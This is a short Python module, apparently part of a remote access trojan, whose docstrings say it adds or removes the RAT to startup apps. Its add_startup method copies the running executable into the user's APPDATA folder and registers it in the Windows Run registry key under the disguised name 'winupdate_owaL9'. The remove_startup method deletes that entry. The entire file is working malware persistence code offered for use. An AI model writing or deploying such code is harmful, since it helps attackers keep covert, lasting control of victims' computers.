import os
import shutil
import sys
import winreg


class Startup:
    """
    Adds or removes RAT to startup apps
    """

    def __init__(self) -> None:
        """
        Constructor to create Startup project from which we can call the methods
        """
        pass

    def add_startup(self):
        """
        Adds .exe RAT file to startup using Window's registry
        """

        file_path = os.path.realpath(sys.argv[0])
        hidden_path = os.path.join(os.path.normpath(os.environ["APPDATA"]), os.path.basename(file_path))
        shutil.copyfile(file_path, hidden_path)

        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
        winreg.CloseKey(regkey)
    
    def remove_startup(self):
        """
        Removes .exe file from startup by deleting windows registry key
        """
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_ALL_ACCESS)

        winreg.DeleteValue(key, "winupdate_owaL9")
        winreg.CloseKey(key)
